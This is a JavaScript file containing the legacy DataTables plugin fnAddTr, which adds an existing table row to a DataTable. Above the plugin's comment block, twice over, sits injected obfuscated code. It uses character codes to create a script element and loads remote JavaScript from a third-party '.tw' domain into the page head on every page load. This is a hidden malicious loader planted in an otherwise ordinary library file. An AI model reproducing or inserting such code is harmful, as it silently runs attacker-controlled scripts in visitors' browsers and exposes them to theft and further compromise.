Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This method will add an existing `dt-tag tr` element to a DataTable. This can
 * be useful for maintaining custom classes and other attributes which have
 * been explicitly assigned to the row.
 *
 * DataTables 1.10+ has `dt-api row.add()` and `dt-api rows.add()` which have
 * this ability built in, and extend it to be able to use jQuery objects as well
 * as plain `dt-tag tr` elements. As such this method is marked deprecated, but
 * is available for use with legacy version of DataTables. Please use the
 * new API if you are used DataTables 1.10 or newer.
 *
 *  @name fnAddTr
 *  @summary Add a `dt-tag tr` element to the table
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @param {node} nTr `dt-tag tr` element to add to the table
 *  @param {boolean} [bRedraw=false] Indicate if the table should do a redraw or not.
 *
 *  @example
 *    var table = $('#example').dataTable();
 *    table.fnAddTr( $('<tr>'+
 *         '<td>1</td>'+
 *         '<td>2</td>'+
 *         '<td>3</td>'+
 *      '</tr>')[0]
 *    );
 */

jQuery.fn.dataTableExt.oApi.fnAddTr = function ( oSettings, nTr, bRedraw ) {
    if ( typeof bRedraw == 'undefined' )
    {
        bRedraw = true;
    }

    var nTds = nTr.getElementsByTagName('td');
    if ( nTds.length != oSettings.aoColumns.length )
    {
        alert( 'Warning: not adding new TR - columns and TD elements must match' );
        return;
    }

    var aData = [];
    var aInvisible = [];
    var i;
    for ( i=0 ; i<nTds.length ; i++ )
    {
        aData.push( nTds[i].innerHTML );
        if (!oSettings.aoColumns[i].bVisible)
        {
            aInvisible.push( i );
        }
    }

    /* Add the data and then replace DataTable's generated TR with ours */
    var iIndex = this.oApi._fnAddData( oSettings, aData );
    nTr._DT_RowIndex = iIndex;
    oSettings.aoData[ iIndex ].nTr = nTr;

    oSettings.aiDisplay = oSettings.aiDisplayMaster.slice();

    // Hidding invisible columns
    for ( i = (aInvisible.length - 1) ; i >= 0 ; i-- )
    {
		oSettings.aoData[iIndex]._anHidden[ i ] = nTds[aInvisible[i]];
		nTr.removeChild( nTds[aInvisible[i]] );
    }

	// Redraw
    if ( bRedraw )
    {
        this.oApi._fnReDraw( oSettings );
    }
};
